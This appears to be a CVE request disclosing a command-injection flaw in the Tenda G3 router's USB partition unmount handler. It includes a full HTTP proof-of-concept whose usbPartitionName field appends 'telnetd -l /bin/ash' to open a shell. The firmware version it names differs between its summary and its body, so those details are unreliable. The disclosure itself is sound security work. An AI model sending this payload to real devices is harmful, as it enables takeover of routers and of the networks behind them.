# CVE Request: Remote Code Execution Vulnerability in Tenda G3 Router

## Summary

* **Vulnerability Type**: Remote Code Execution (RCE)
* **Vendor**: Tenda
* **Product**: Tenda G3 Router
* **Firmware Version**: [last G3V3.0br\_V15.11.0.20(10700)\_CN\_TDC]
* **CVE ID**: [To be assigned]
* **Author**: Question\_h
* **Status**: Awaiting CVE Assignment

## Vulnerability Description

A Remote Code Execution (RCE) vulnerability was discovered in the Tenda G3 Router firmware version V15.03.05.05 . The vulnerability exists due to improper input validation in formSetUSBPartitionUmount function. By exploiting this vulnerability, an attacker can execute arbitrary commands on the router with administrative privileges, leading to full system compromise.

## Affected Products

* **Vendor**: Tenda
* **Model**: G3 Router
* **Firmware Version**:V15.03.05.05

## Exploitation Details

### Vulnerability Analysis

The vulnerability is triggered when through a specially HTTP request. This allows an attacker to inject and execute arbitrary commands on the router.

### Reproduction Steps

1. Connect to the Tenda G3 Router with the vulnerable firmware version V15.03.05.05.
2. Access the router's web interface or send an HTTP request to the vulnerable endpoint.
3. Use the following payload to exploit the vulnerability:

   ```
   POST /goform/umountUSBPartition HTTP/1.1
   Host: 192.168.0.252
   Content-Length: 42
   Accept: text/plain, */*; q=0.01
   X-Requested-With: XMLHttpRequest
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
   Content-Type: application/x-www-form-urlencoded; charset=UTF-8
   Origin: http://192.168.0.252
   Referer: http://192.168.0.252/USB/usbFileShare.html?0.9717170938610826
   Accept-Encoding: gzip, deflate, br
   Accept-Language: zh-CN,zh;q=0.9
   Cookie: _:USERNAME:_=; G3v3_user=
   Connection: keep-alive

   usbPartitionName=sda1;telnetd -l /bin/ash
   ```
4. The router executes the injected commands, resulting in RCE.

## Impact

Successful exploitation of this vulnerability allows an unauthenticated attacker to execute arbitrary code on the router with administrative privileges. This can lead to:

* Full system compromise.
* Unauthorized access to the network.
* Potential for further attacks on connected devices.
